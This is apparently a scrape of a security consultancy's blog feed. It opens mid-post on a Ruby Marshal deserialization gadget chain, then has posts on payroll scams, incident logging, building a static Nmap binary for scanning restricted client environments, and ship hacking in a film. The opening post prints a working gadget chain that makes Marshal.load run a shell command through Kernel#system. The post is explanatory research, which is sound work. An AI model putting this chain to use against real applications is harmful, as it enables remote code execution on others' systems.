a.instance_variable_set('@name', :system) # Gadget B b = ActionView::StreamingBuffer.allocate b.instance_variable_set('@block', a) # Reference to Gadget A # Gadget C c = BufferedTokenizer.allocate c.instance_variable_set('@trim', -1) c.instance_variable_set('@input', b) # Reference to Gadget B c.instance_variable_set('@tail', COMMAND) # Gadget D d = Dry::Types::Constructor::Function::MethodCall::PrivateCall.allocate d.instance_variable_set('@target', c) # Reference to Gadget C d.instance_variable_set('@name', :extract) # Gadget E e = ActionView::StreamingTemplateRenderer::Body.allocate e.instance_variable_set('@start', d) # Reference to Gadget D # Override marshal_dump method to avoid execution # when serializing. module ActiveRecord module Associations class Association def marshal_dump @data end end end end # Gadget F f = ActiveRecord::Associations::Association.allocate f.instance_variable_set('@data', ['', e]) # Reference to Gadget E # Serialize object to be used in another application through Marshal.load() payload = Marshal.dump(f) # Reference to Gadget F # Example deserialization of the serialized object created Marshal.load(payload)\nThe gadgets are labeled A -> F and defined in this order in the source code, but during serialization/deserialization the process occurs starting from F -> A. We pass Gadget F to the Marshal.dump\nfunction which kicks off the chain until we get to Gadget A.\nVisualization\nThe following diagram visualizes the flow of the gadget chain. This is a high-level recap of the gadget chain in the order it actually gets executed.\nNote: The word junk\nis used as a placeholder any time a function is receiving an argument, but the actual argument does not matter to our gadget chain. We often don’t even control the argument in these cases.\nThe next few sections will break down the gadget chain into smaller pieces and have annotations along with the library source code that explains what we are doing at each step.\nCode Walkthrough\nLibraries\nChain Source\nrequire 'action_view' # required by rails require 'active_record' # required by rails require 'dry-types' # required by grape require 'eventmachine' # required by faye COMMAND = 'touch /tmp/hello'\n- Include all the necessary libraries for this gadget chain. The environment we tested used\nrails\n,grape\n, andfaye\nwhich imported all of the necessary libraries. COMMAND\nis the command that will get executed by the gadget chain when it is deserialized.\nGadget A\nChain Source\na = Dry::Types::Constructor::Function::MethodCall::PrivateCall.allocate a.instance_variable_set('@target', Kernel) a.instance_variable_set('@name', :system)\nLibrary Source\n# https://github.com/dry-rb/dry-types/blob/cfa8330a3cd9461ed60e41ab6c5d5196f56091c4/lib/dry/types/constructor/function.rb#L85-L89 class PrivateCall < MethodCall def call(input, &block) @target.send(@name, input, &block) end end\n- Allocate\nPrivateCall\nasa\n. - Set\n@target\ninstance variable toKernel\n. - Set\n@name\ninstance variable to:system\n.\nResult: When a.call('touch /tmp/hello')\ngets called from Gadget B, this gadget will then call Kernel.send(:system, 'touch/tmp/hello', &block)\n.\nGadget B\nChain Source\nb = ActionView::StreamingBuffer.allocate b.instance_variable_set('@block', a)\nLibrary Source\n# https://github.com/rails/rails/blob/f0d433bb46ac233ec7fd7fae48f458978908d905/actionview/lib/action_view/buffers.rb#L108-L117 class StreamingBuffer # :nodoc: def initialize(block) @block = block end def <<(value) value = value.to_s value = ERB::Util.h(value) unless value.html_safe? @block.call(value) end\n- Allocate\nStreamingBuffer\nasb\n. - Set\n@block\ninstance variable to Gadget A,a\n.\nResult: When b << 'touch /tmp/hello'\ngets called, this gadget will then call a.call('touch /tmp/hello')\n.\nGadget C\nChain Source\nc = BufferedTokenizer.allocate c.instance_variable_set('@trim', -1) c.instance_variable_set('@input', b) c.instance_variable_set('@tail', COMMAND)\nLibrary Source\n# https://github.com/eventmachine/eventmachine/blob/42374129ab73c799688e4f5483e9872e7f175bed/lib/em/buftok.rb#L6-L48 class BufferedTokenizer ...omitted for brevity... def extract(data) if @trim > 0 tail_end = @tail.slice!(-@trim, @trim) # returns nil if string is too short data = tail_end + data if tail_end end @input << @tail entities = data.split(@delimiter, -1) @tail = entities.shift unless entities.empty? @input << @tail entities.unshift @input.join @input.clear @tail = entities.pop end entities end\n- Allocate\nBufferedTokenizer\nasc\n. - Set\n@trim\ninstance variable to-1\nto skip the firstif\nstatement. - Set\n@input\ninstance variable to Gadget B,b\n. - Set\n@tail\ninstance variable to the command that will eventually get passed toKernel::system\n.\nResult: When c.extract(junk)\ngets called, this gadget will then call b << 'touch /tmp/hello'\n.\nGadget D\nChain Source\nd = Dry::Types::Constructor::Function::MethodCall::PrivateCall.allocate d.instance_variable_set('@target', c) d.instance_variable_set('@name', :extract)\nLibrary Source\n# https://github.com/dry-rb/dry-types/blob/cfa8330a3cd9461ed60e41ab6c5d5196f56091c4/lib/dry/types/constructor/function.rb#L85-L89 class PrivateCall < MethodCall def call(input, &block) @target.send(@name, input, &block) end end\n- Allocate\nPrivateCall\nasd\n. - Set\n@target\ninstance variable to Gadget C,c\n. - Set\n@name\ninstance variable to:extract\n, as the method that will be called onc\n.\nResult: When d.call(junk)\ngets called, this gadget will then call c.send(:extract, junk, @block)\n.\nGadget E\nChain Source\ne = ActionView::StreamingTemplateRenderer::Body.allocate e.instance_variable_set('@start', d)\nLibrary Source\n# https://github.com/rails/rails/blob/f0d433bb46ac233ec7fd7fae48f458978908d905/actionview/lib/action_view/renderer/streaming_template_renderer.rb#L14-L27 class Body # :nodoc: def initialize(&start) @start = start end def each(&block) begin @start.call(block) rescue Exception => exception log_error(exception) block.call ActionView::Base.streaming_completion_on_exception end self end\n- Allocate\nBody\nase\n. - Set\n@start\ninstance variable to Gadget D,d\n.\nResult: When e.each(junk)\nis called, this gadget will then call d.call(junk)\n.\nGadget F\nChain Source\nmodule ActiveRecord module Associations class Association def marshal_dump @data end end end end f = ActiveRecord::Associations::Association.allocate f.instance_variable_set('@data', ['', e])\nLibrary Source\n# https://github.com/rails/rails/blob/f0d433bb46ac233ec7fd7fae48f458978908d905/activerecord/lib/active_record/associations/association.rb#L184-L193 def marshal_dump ivars = (instance_variables - [:@reflection, :@through_reflection]).map { |name| [name, instance_variable_get(name)] } [@reflection.name, ivars] end def marshal_load(data) reflection_name, ivars = data ivars.each { |name, val| instance_variable_set(name, val) } @reflection = @owner.class._reflect_on_association(reflection_name) end\n- Override the\nmarshal_dump\nmethod so that we only serialize@data\n. - Allocate\nAssociation\nasf\n. - Set\n@data\ninstance variable to the array['', e]\nwheree\nis Gadget E. The empty string at index 0 is not used for anything.\nResult: When deserialization begins, this gadget will then call e.each(junk)\n.\nSerialize and Deserialize\npayload = Marshal.dump(f)\n- Gadget F,\nf\nis passed toMarshal.dump\nand the entire gadget chain is serialized and stored inpayload\n. Themarshal_load\nfunction in Gadget F will be invoked upon deserialization.\nIf you want to execute the payload you just generated you can pass the payload\nback into Marshal.load\n. Since we already have all the libraries loaded in this script it will deserialize and execute the command you defined.\nMarshal.load(payload)\npayload\nis passed toMarshal.load\nto deserialize the gadget chain and execute the command.\nWe have just gone through the entire gadget chain from end to start. I hope this walk through helped to demystify the process a bit and give you a bit of insight into the process that goes behind creating a deserialization gadget chain. I highly recommend going through the exercise of creating a gadget chain from scratch, but be warned that at times it feels very tedious and unrewarding, until all the pieces click together.\nIf you’re a Ruby developer, what can you take away from reading this? This blog post has been primarily focused on an exploitation technique that is inherent in Ruby, so there isn’t anything easy to do to prevent it. Your best bet is to focus on ensuring that the risks of deserialization are not present in your application. To do that, be very careful when using Marshal.load(payload)\nand ensure that no user controlled payloads find their way into the deserialization process. This also applies to any other parsing you may do in Ruby that uses Marshal.load\nbehind the scenes. Some examples include: YAML, CSV, and Oj. Make sure to also read through the documentation for your libraries to see if there is any “safe” loading which may help to reduce the risk.\nCredit for the title artwork goes to Pau Riva.", "timestamp": "2025-10-21T13:34:16.450914"}
{"source": "blog", "feed": "https://www.pentestpartners.com/feed/", "title": "Stop payroll diversion scams before they start", "url": "https://www.pentestpartners.com/security-blog/stop-payroll-diversion-scams-before-they-start/", "published": "Tue, 21 Oct 2025 10:44:00 +0000", "content": "Tl;DR\n- Scammers send emails to the payroll team in an attempt to change an unlucky employee’s banking details.\n- They harvest LinkedIn for details about potential victims.\n- An organisation can prevent this type of fraud by putting control measures in place.\n- You can adjust your LinkedIn privacy settings to protect yourself, and your colleagues\nIntroduction\nIn my previous job as the SOC manager for a public sector organisation, I would often see attempts from scammers trying to get some unlucky employee’s payroll details changed to their own bank account. The emails weren’t exactly sophisticated and looked a bit like this:\nThe sender’s email address would usually be a different and seemingly random Gmail address and would generally not match up with their victim’s name – something like [email protected]. In most cases, this red flag would be enough for the vigilant recipient to report the email as phishing, where it could be reviewed by the SOC team.\nHowever, two aspects of the email added a bit of realism:\n- They always managed to pick a recipient who worked in payroll, and\n- The signature would usually contain the victim’s correct job title\nIt wasn’t possible to block these emails. There were no links, or patterns that we could have used to identify and filter them out.\nUnfortunately, one time, the fraudsters’ chosen recipient was the head of payroll rather than a payroll administrator. They didn’t spot the red flag and simply forwarded the email to someone who could action the request, and in doing so added legitimacy to it. The request was no longer from a random external email address but from the head of payroll. The victim’s payroll details were then changed but luckily it was noticed before any money was sent to that account!\nHow can organisations and individuals better protect themselves?\nFrom an organisation point of view, it’s crucial to have strong processes and procedures around updates to payroll information.\nThe easiest, and safest, approach would be to reject any request sent over email and allow employees to self-service (i.e. update the details themselves). Any system would need to have suitable security controls in place, such as MFA along with confirmation emails for any changes.\nIf that’s not possible, then the organisation should only accept requests made from internal email and always follow up with some form of validation, such as a phone call to a phone number on their file, before the details are updated.\nM365 offers user impersonation protection, and Mimecast has a similar feature, which could help to block these kinds of emails, however the payroll team should be aware of them and have regular phishing awareness training.\nIn the above case, there were internal policies that tried to mitigate the attack path by having employees contacted to change any personal data. However, this wasn’t enough, as emails could be missed or ignored. Self-service wasn’t an option, so the organisation tightened its procedures and currently refuses any requests made via email. Before making any changes, employees are now required to contact the payroll team and verify their identity.\nHow can you mitigate the initial risk of becoming a target?\nWell firstly, it’s important to know where the scammers are getting the information from. They aren’t hacking into databases, as they can easily find it on LinkedIn. It’s a straightforward approach. First find someone who works in payroll by using a Google dork to search for people with “payroll manager” or “payroll administrator” in their LinkedIn profile. The screenshot below shows a fake profile, but reflects one that an attacker could easily find.\nOnce they have selected their first target, they will pivot and find someone else working in the same company. This can all be done without even touching LinkedIn, however by signing into LinkedIn and using the internal search, they can massively increase their proverbial net.\nFrom there, a little bit of OSINT should help them work out the format of the payroll target’s email address – in this fictional case it was <firstname>.<lastname>@acme.ltd.\nThe most important thing you can do to protect yourself is to review your privacy settings on LinkedIn. However, this is easier said than done – a lot of people are on LinkedIn to promote themselves and boost their current and future career prospects. Therefore, adjusting your privacy settings could unintentionally decrease your visibility and prevent others from viewing your profile entirely, thereby defeating the original purpose of using LinkedIn.\nI’m not going to go into too much detail about the various privacy options available on LinkedIn – there are plenty of guides available. But there is one option that I would recommend everyone enables, especially those working in payroll, and that’s changing your last name visibility:\nThis setting means that only direct connections will be able to see your last name, everyone else will just see an initial. This one change will massively reduce the risk of your details being used in this kind of payroll scam.\nObviously, this relies on you being careful with who you connect with and keeping an eye out for fake profiles – the NPSA have a great campaign about this. You should also check that your vanity URL does not include your full name. You can change this to anything if it isn’t used by someone else.\nWhile you are at it, I’d recommend reviewing your entire profile for unnecessary information. Consider adjusting your job title and limiting the amount of detail you share about your work. I’d recommend either removing (or tweaking) your job title and don’t go into too much detail about your work. The less information you put on LinkedIn, the less it can be used in a scam.\nThe theme of this blog post has been around payroll fraud, but the same tactics are used to aid social engineering attacks. Adding information helps add realism to spear phishing emails (e.g. Hi Alice, I’ve been working with Bob on Project X – can you send me some super-secret information? Thanks). I realise I’m getting off topic, so please take a look at the previously mentioned NPSA campaign.\nConclusion\nThis kind of fraud is, unfortunately, quite common. Hopefully this post will help you and prevent you from being selected as a target. However, if you have been a victim, then it’s important that you report it to Action Fraud as soon as possible.\nHelpful settings:\nYour public profile:", "timestamp": "2025-10-21T13:34:18.775012"}
{"source": "blog", "feed": "https://www.pentestpartners.com/feed/", "title": "The logs you’ll wish you had configured if (when) you are breached…", "url": "https://www.pentestpartners.com/security-blog/the-logs-youll-wish-you-had-configured-if-when-you-are-breached/", "published": "Fri, 17 Oct 2025 09:14:49 +0000", "content": "TL;DR\n- Logs of various types are invaluable sources of evidence in incident response.\n- Windows Event Logs: Ensure Security.evtx and System.evtx have increased sizes with archiving enabled and appropriate retention policies.\n- Download and install Sysmon from Microsoft’s Sysinternals suite to capture additional system activity such as processes, network connections and file/registry changes.\n- Enable VPN logging to track who connects, when and from where.\n- Actively monitor your anti-virus/EDR logs and retain for extended periods.\n- Consider enabling logging for individual and custom applications. Ensure logging of errors, exceptions and critical business actions.\n- Ensure you have extended retention periods in case of an incident.\n- If you can, centralise your logging. If you can’t, forward logs for retention.\nIntroduction\nWhen responding to an incident, logs provide a vital record of events within a system and serve as a critical source of evidence during an incident investigation. They help identify what happened, where, when, and by whom.\nWith complete and well-configured logging, investigators can quickly reconstruct events such as unauthorised access or large data transfers and identify affected systems, users, and data.\nFor example, you check your emails one morning and find a ransom note that your company’s data is being held hostage. In a well-prepared environment, your incident response team can immediately pull logs: The Windows Event Logs show clear authentication attempts, Sysmon traces the attacker’s process chain, and anti-virus logs confirm where the payload was quarantined.\nHowever, if you’re just starting out and want to protect your organisation, logging can seem overwhelming. With the numerous types of logs available, where would be the best place to begin?\nThe short answer is that it depends on your organisation’s environment and which systems are in place.\nFor this reason, we’ve chosen to keep it simple and discuss 5 types of logging which we think will apply to most organisations.\n- Windows event logs\nWindows Event Log files (EVTX) are enabled by default on Windows systems and use a default configuration for logging system, security, application and event data. This default configuration determines which events are logged, for how long, the capacity sizes of logs, and what happens when a log reaches its maximum size. You’ll need to consider adjusting policies, log sizes and retention settings to suit your organisation’s needs.\nIt is likely that an internal conversation will be required to decide upon maximum log sizes, given that there are various implications to consider, such as storage costs and compliance requirements. However, we would recommend that the maximum size for Security.evtx should be set to at least 1GB to avoid the possibility that critical events are overwritten. As with the configuration of most logs, these limits will be dependent on a few factors, such as the size of the business. For a small organisation with only a handful of users, a smaller limit would suffice, along with appropriate retention policies.\nIn line with this, it is recommended that you select to ‘archive logs when full’ and retain these for an agreed period, rather than the alternative option of overwriting once full. These changes can be made via Windows Event Viewer by right clicking a log and selecting ‘Properties’.\nIf cost implications are a limiting factor for your organisation when making these decisions, it would be wise to prioritise the increased size and retention of Security.evtx and System.evtx and use event filtering to forward only the most critical logs, such as failed logon attempts and the escalation of account privileges, into a SIEM (if you have one!).\n- Sysmon (system monitor)\nHere’s one that, as investigators, we hardly ever see in the wild, despite it being an invaluable source of evidence in incident response investigations.\nSysmon is a tool from Microsoft’s Sysinternals suite that extends the Windows Event Log with detailed system activity logs, making it highly useful for security monitoring and threat detection by capturing activities that are not available through standard Windows event logging.\nExamples of these additional activities include:\n- Process creation with command-line arguments.\n- File creation, modifications, and deletions.\n- Registry changes.\n- Network connections.\nSysmon allows for enhanced threat detection by providing visibility into both process and network activities, which helps us in identifying malicious behaviours, such as the execution of malicious scripts, abnormalities in network connections and unauthorised changes to system files and/or registry keys, as well as providing vital forensic artefacts such as hashes of executed files and timestamps for logged events.\nSysmon logs can also be ingested into a SIEM solution, if you have one, which allows for the correlation of data with other data sources.\nBest of all, it’s free to use! Sysmon is a valuable tool in building a robust security posture for your environment.\n- VPN\nDespite being required to comply with various regulations, VPN logging can also provide a critical source of evidence when it comes to detecting unauthorised access to your network by tracking not only who is connecting but also when and from where. This is crucial information for detecting abnormalities, such as logons outside of typical working hours or logon attempts from suspicious or unexpected locations. Without adequate logging, it may be impossible to tell who connected, let alone when and from where.\n- Antivirus/EDR\nYou’re probably thinking, “Of course we have antivirus software!”, but how often and how closely do you monitor the logs?\nAntivirus (AV) logs can be another valuable source of information for investigators, providing information surrounding a wide range of security events and, when used properly, can significantly improve the ability to detect, analyse and respond to an incident.\nShould you become the victim of a security incident, these logs will provide invaluable information, such as:\n- Timestamps\n- Event Types\n- Malware Signatures\n- File path & hash\n- Process/Executable\n- Implicated user & device\n- Any action taken by the AV software\nConfigure your AV software to enable detailed logging and be sure to store logs for an extended period to allow for retrospective analysis. It’s all well and good having AV software, but you’ve lost a valuable source of information if the logs have been and gone by the time it comes to an investigation!\nLast but certainly not least, you need to be actively monitoring your AV logs. With detailed logging, extended retention periods and active monitoring, you can significantly enhance your business’ incident response capabilities and detect potential threats sooner.\n- Application logs\nApplication logs store a record of events which are generated by various applications. Not only are these useful in troubleshooting performance issues, but they can also be helpful in detecting unauthorised access.\nWhen configuring application logs, do consider:\n- Logging errors and exceptions\n- Keeping record of any business-critical actions (think financial transactions, for example)\n- The varying importance of individual event types – particularly user logons (including failed logons!), configuration changes, API requests, etc.\nConclusion\nIn the case of an attack, logs will allow responders to see who did what, and when. Aside from enabling investigators to identify the root cause of an attack, the presence of error messages will aid in leading investigators to the source of the issue, allowing for a faster recovery time for your business.\nConfiguration is key! If you log too little, you’ll be missing vital information. If you log too much, you’ll face storage issues and unnecessary noise.\nLast but by no means least… if you can, centralise your logging! Use a SIEM solution if you have one, as this will allow the correlation of various data sources. Otherwise, ensure that you set up some form of log forwarding from endpoints to ensure that you don’t lose visibility in case of an incident.\nReview your logging configuration today – before you need it!", "timestamp": "2025-10-21T13:34:19.634900"}
{"source": "blog", "feed": "https://www.pentestpartners.com/feed/", "title": "Compiling static Nmap binary for jobs in restricted environments", "url": "https://www.pentestpartners.com/security-blog/compiling-static-nmap-binary-for-jobs-in-restricted-environments/", "published": "Tue, 14 Oct 2025 09:26:00 +0000", "content": "TL;DR\n- If our target system does not have linked libraries, we cannot run regular tools\n- Random static binaries downloaded from the internet can be dangerous\n- I will show you how you can compile our own static binaries to solve the problem\nThe problem\nHave you ever found yourself in a client’s hardened, containerised environment where you needed to scan their internal infrastructure? If so, you’ve probably encountered an issue where the instance doesn’t have all the libraries required to run your tools.\nIt’s a nice problem for the client to have, as it shows how well security best practices have been adhered to when developing the environment. A minimalistic container, containing only the bare minimum software needed for administrative tasks, is ideal in a zero-trust environment that could be attacked at any moment. Luckily for us, as attackers, we have a modern solution at hand: cross-compiling all we need in a fairly small binary targeting the client’s instance architecture.\nWhy official binaries don’t work in this scenario\nScouring the internet for a solution wasn’t simple. Nmap’s official binaries are dynamically linked, so to work, they need to use additional libraries that are commonly found in the file system, such as ld-linux.so and libc.so on Linux, or kernel32.dll and msvcrt.dll on Windows. This means we are unlikely to be able to run the dynamically linked binary if we drop it into a restricted environment that we want to enumerate.\nFishing out there for static binaries, be it Nmap or any other type, might constitute a very dangerous exercise and perhaps a huge blunder, as we’re about to use a black box which we have no control over, or any guarantee it will contain what we want. The only way for us to be absolutely sure those binaries do not contain unwanted functions is to reverse engineer the hell out of them.\nNow, such an endeavour is a huge effort for us regular mortals and a massive side quest, so instead of spending hours making sure it’s safe first, you might be tempted to risk running it, which I would not recommend. Luckily for you, I will touch on the solution later in the blog post.\nThe dead end with local compilation\nIf we directly compile the source code provided in Nmap’s GitHub repo, we will end up with a dynamically linked binary, which again serves no purpose in this scenario:\n# Latest version at the time of writing is 7.98\ncurl -LO https://nmap.org/dist/nmap-7.98.tar.bz2\n# Official Nmap compilation guide (available here: [Download the Free Nmap Security Scanner for Linux/Mac/Windows](https://nmap.org/download.html#source)):\nbzip2 -cd nmap-7.98.tar.bz2 | tar xvf -\ncd nmap-7.98\n./configure\nmake\nsu root\nmake install\nAfter compiling, we end up with the following file, as expected:\nThis is also true for the officially sourced Nmap binary, when we install it from a major distro’s package manager.\nIf we upload the binary as-is on a restricted environment, which does not contain all needed linked libraries, we run into some problems:\nbash: ./nmap: /lib64/ld-linux-x86-64.so.2: No such file or directory\nIf we don’t have access or permission to install glibc in the system (or the CPU isn’t x64, but we’ll assume it’s our target architecture), then we’re in trouble.\n… Or are we?\nThe solution\nEnter Docker and shell scripting to the rescue. Two powerful skills to have in your arsenal! With Docker you can get a build runner in a couple of instructions, and with a couple more lines of code you can instruct the runner to statically compile what you want, exactly the way you want it. In this scenario we’re going to target as our supposed foothold the architecture of a Bastion Host instance living in an AWS VPC.\nubuntu@ip-172-31-30-70:~$ uname -a\nLinux ip-172-31-30-70 6.8.0-1035-aws #37~22.04.1-Ubuntu SMP Wed Aug 13 13:49:56 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux\nNow we have the correct OS and the correct architecture to target, we can instruct the Docker engine to use Linux and x86_64 as our compiling machine:\ndocker run --rm --platform=linux/amd64 -v \"$(pwd)\":/out -w /tmp ubuntu:22.04 bash -lc '<our commands we want to run inside the building container>'\nThe next steps are as follows:\n1. Making sure we have all the tools we need inside the container to achieve our goal:\nset -euo pipefail\nexport DEBIAN_FRONTEND=noninteractive\napt-get update && apt-get install -y --no-install-recommends \\\nbuild-essential ca-certificates curl bzip2 xz-utils pkg-config perl python3 file git \\\nautomake autoconf libtool m4 zlib1g-dev\n2. Building a static OpenSSL library:\nOSSL=\"1.1.1w\"\ncurl -fsSLO \"https://www.openssl.org/source/openssl-$OSSL.tar.gz\"\ntar xzf \"openssl-$OSSL.tar.gz\" && cd \"openssl-$OSSL\"\n./Configure no-shared no-zlib linux-x86_64 -static --prefix=/opt/ossl\nmake -j\"$(nproc)\" && make install_sw\ncd /tmp\n3. Building a static PCRE2 library (needed for the NSE scripts)\nPCRE2=10.43\ncurl -fsSLO \"https://github.com/PCRE2Project/pcre2/releases/download/pcre2-$PCRE2/pcre2-$PCRE2.tar.bz2\"\ntar xjf \"pcre2-$PCRE2.tar.bz2\" && cd \"pcre2-$PCRE2\"\n./configure --disable-shared --enable-static --prefix=/opt/pcre2\nmake -j\"$(nproc)\" && make install\ncd /tmp\n4. Building our static Nmap binary using the statically compiled libraries above\n# Build Nmap\nNMAP=7.98\ncurl -fsSLO \"https://nmap.org/dist/nmap-$NMAP.tar.bz2\"\ntar xjf \"nmap-$NMAP.tar.bz2\" && cd \"nmap-$NMAP\"\nexport CPPFLAGS=\"-I/opt/ossl/include -I/opt/pcre2/include\"\nexport LDFLAGS=\"-L/opt/ossl/lib -L/opt/pcre2/lib -static -static-libstdc++ -static-libgcc\"\nexport LIBS=\"-lpcre2-8 -ldl -lpthread -lz\"\n./configure \\\n--with-openssl=/opt/ossl \\\n--with-libpcre=/opt/pcre2 \\\n--with-libpcap=included \\\n--with-libdnet=included \\\n--without-zenmap --without-ndiff --without-nmap-update\nsed -i -e \"s/^shared: /shared: #/\" libpcap/Makefile || true\nmake -j1 V=1 nmap\nstrip nmap\n5. Bundle it all together and get the container to spit it out to your system, along with the NSE scripts:\nmkdir -p /out/nmap-bundle/nmap-data\ncp nmap /out/nmap-bundle/nmap-linux-amd64-static\ncp -r scripts nselib /out/nmap-bundle/nmap-data/\ncp nse_main.lua nmap-services nmap-protocols nmap-service-probes \\\nnmap-mac-prefixes nmap-os-db nmap-payloads nmap-rpc \\\n/out/nmap-bundle/nmap-data/ 2>/dev/null || true\ntar -C /out -czf /out/nmap-linux-amd64-static-bundle.tar.gz nmap-bundle\nEnd result\nCongratulations! You now have your safe, self-made, static Nmap binary, ready to be dropped in any environment:\nTool drop\nIf you’re interested in the full script, I’ll place it at the bottom of the blog post so that you can simply copy/paste it into your terminal if you want to try it out. For convenience, I’ve coded a little Go interactive program that allows you to select all the flags, making as default the same versions that I’ve used throughout this example:\nIt then spits out the whole command to the terminal and attempts to run it.\nIt’s available on GitHub: 0x5ubt13 on GitHub: Static Nmap Binary Generator\nConclusion\nDownloading opaque binaries from non-official repositories on the internet should be avoided where possible to stay safe. By having the skill to make our own static binaries, we are given the freedom to run any kind of software in any kind of container, as long as we can get the program across and the target machine is not fully restricted (we’ll still need services like DNS resolution, and not to be blocked by AppArmor, seccomp profiles, or SELinux), while keeping us relatively safe from shared library injection attacks.\nFull script pieced together:\ndocker run --rm --platform=linux/amd64 -v \"$(pwd)\":/out -w /tmp ubuntu:22.04 bash -lc '\n# Prepare the container\nset -euo pipefail\nexport DEBIAN_FRONTEND=noninteractive\napt-get update && apt-get install -y --no-install-recommends \\\nbuild-essential ca-certificates curl bzip2 xz-utils pkg-config perl python3 file git \\\nautomake autoconf libtool m4 zlib1g-dev\n# Build static OpenSSL\nOSSL=\"1.1.1w\"\ncurl -fsSLO \"https://www.openssl.org/source/openssl-$OSSL.tar.gz\"\ntar xzf \"openssl-$OSSL.tar.gz\" && cd \"openssl-$OSSL\"\n./Configure no-shared no-zlib linux-x86_64 -static --prefix=/opt/ossl\nmake -j\"$(nproc)\" && make install_sw\ncd /tmp\n# Build static PCRE2\nPCRE2=10.43\ncurl -fsSLO \"https://github.com/PCRE2Project/pcre2/releases/download/pcre2-$PCRE2/pcre2-$PCRE2.tar.bz2\"\ntar xjf \"pcre2-$PCRE2.tar.bz2\" && cd \"pcre2-$PCRE2\"\n./configure --disable-shared --enable-static --prefix=/opt/pcre2\nmake -j\"$(nproc)\" && make install\ncd /tmp\n# Build static Nmap\nNMAP=7.98\ncurl -fsSLO \"https://nmap.org/dist/nmap-$NMAP.tar.bz2\"\ntar xjf \"nmap-$NMAP.tar.bz2\" && cd \"nmap-$NMAP\"\nexport CPPFLAGS=\"-I/opt/ossl/include -I/opt/pcre2/include\"\nexport LDFLAGS=\"-L/opt/ossl/lib -L/opt/pcre2/lib -static -static-libstdc++ -static-libgcc\"\nexport LIBS=\"-lpcre2-8 -ldl -lpthread -lz\"\n./configure \\\n--with-openssl=/opt/ossl \\\n--with-libpcre=/opt/pcre2 \\\n--with-libpcap=included \\\n--with-libdnet=included \\\n--without-zenmap --without-ndiff --without-nmap-update\nsed -i -e \"s/^shared: /shared: #/\" libpcap/Makefile || true\nmake -j1 V=1 nmap\nstrip nmap\n# Bundle binary + all NSE data\nmkdir -p /out/nmap-bundle/nmap-data\ncp nmap /out/nmap-bundle/nmap-linux-amd64-static\ncp -r scripts nselib /out/nmap-bundle/nmap-data/\ncp nse_main.lua nmap-services nmap-protocols nmap-service-probes \\\nnmap-mac-prefixes nmap-os-db nmap-payloads nmap-rpc \\\n/out/nmap-bundle/nmap-data/ 2>/dev/null || true\ntar -C /out -czf /out/nmap-linux-amd64-static-bundle.tar.gz nmap-bundle\n# Show results\necho \"===== OUTPUT =====\"; ls -lah /out; echo \"===== FILE TYPE =====\"\nfile /out/nmap-bundle/nmap-linux-amd64-static || true\n'", "timestamp": "2025-10-21T13:34:20.501332"}
{"source": "blog", "feed": "https://www.pentestpartners.com/feed/", "title": "What Speed 2 gets right and wrong about ship hacking", "url": "https://www.pentestpartners.com/security-blog/what-speed-2-gets-right-and-wrong-about-ship-hacking/", "published": "Wed, 08 Oct 2025 01:13:00 +0000", "content": "TL;DR\n- What Speed 2: Cruise Control got right and wrong about hacking ships\n- Some are genuinely plausible, even 30 years later. Others are pure movie magic\n- Modern cruise ships are a challenge to secure, owing to complexities around IT ,OT and external connectivity\n- Regulations like IACS UR E26/E27 and US Coastguard 33 CFR Part 6 now push operators to tighten controls.\nIntroduction\nIn the field of maritime cyber, we often cite the movie Speed 2: Cruise Control from 1997 as an interesting prediction of the future. It illustrates the reality of today quite well, despite being nearly 30 years old!\nIt’s not a great movie, but the hacking concepts shown in it are actually fairly plausible and just about stand up to scrutiny.\nThe loose plot (spoilers ahead!)\nA recently fired ship’s autopilot software engineer modifies the software on a cruise ship, intending to crash it into an oil tanker. Could it happen? Broadly yes, with time on board and high-privilege physical access. The execution on screen is far-fetched, but the principles are sound.\nWhat can we learn, other than bad acting and scriptwriting?\nHack 1: connecting to the ship’s control network\nJohn Geiger, played by Willem Dafoe, pulls a fibre network cable from the ceiling of his cabin, with the objective of joining the network and taking control of the ship\nIn reality, critical system cabling in the 1990s was never routed through passenger cabin ceiling voids. Even today, these cables run in dedicated conduits, secured behind locked panels.\nThe fibre connector shown on screen does look accurate for the period, but Geiger then plugs it into a box that is anything but:\nIn order to take remote control of the ship’s systems:\nNow, I’m old enough to remember these boxes. They certainly aren’t fibre connectors – it’s a serial switch box with a ‘fibre connector’ sticker on it! Artistic licence++, yet there wasn’t any need to fake a fibre connection. An odd choice from the props department\nPC visuals were all a bit limited in the 90s; some of these are a fair attempt at reproducing marine control and monitoring interfaces of the time, but some are a bit of a joke!\nHere’s Geiger’s laptop UI:\nWhat’s that protocol though?\nWe had a thorough hunt for early ship serial communication protocols, as there were many, but drew a blank. At the time, serial communications based on NMEA0183 sentences were fairly common. RS485 and 232 were also well used, so why invent ‘QB498/s’? Who knows.\nThe interface has the look of an early automation and monitoring system HMI, but it’s more likely it was created for the purpose of the movie. Lovely to see command.com first in the list !\nConclusion: plausible in principle, but the access method to the core network is a bit fanciful\nHack 2: compromising engine controls\nGeiger creates a distraction in the engine room, allowing him to connect a device to an ‘Engine Room Status’ device.\nThat device appears to be a Symbol PPT4600 handheld barcode scanner! It does feature a handy serial interface though, which would be good for the next step:\nHe connects it to a 15 pin d-sub connector and makes some changes, which we assume are related to the ability to shut down the engines remotely later on.\nConclusion: plausible, just\nHack 3: stopping the engine and causing a huge vibration\nStopping the engine. It doesn’t take 10 minutes to stop a ships engine. It takes a few seconds, mostly owing to the rotational momentum of large masses such as the prop shaft. It seems likely that the movie purposefully included a 10-minute engine stop time to create a sense of suspense.\nThe Seabourn Legend is a real ship, so we can check out the veracity of this claim. It was hired for filming for six weeks at a cost of ~$40k/day. It does have four engines, but shutting one down would not result in the huge vibration seen in the movie! Slamming one in to reverse, a full crash stop, would cause huge vibration, but that’s not what is shown.\nThere are also explosions seen in the engine room, suggesting that the ‘top end’ covers were blown off. That’s not how an engine failure would be seen. However, the crew could still stop the engine manually. All large marine engines have manual shut-offs, even if that means turning off the fuel supply. Losing total control of an engine just wouldn’t happen.\nA modern electronically controlled engine could very likely be made to throw itself to pieces if one could alter injection timing. An incident happened in 2021 where a coupling to an injection pump failed, resulting in an injection timing issue and then a significant fire!\nConclusion: implausible in the context shown, but probably more plausible for more recent engine control systems\nDefending against Geiger\n1: Adding ballast water to the ship\nThe ship’s crew decide to add ballast water to slow the ship down. Adding ‘a million litres of water’ is plausible for a ship of the size of the Seabourn Legend. Adding ballast would slow the ship in the manner shown. That said, cruise ships typically carry ballast water for trim – ensuring they are trimmed fore or aft for efficiency. By mis-trimming the vessel with ballast water, say to the forward ballast tanks, it would slow more than 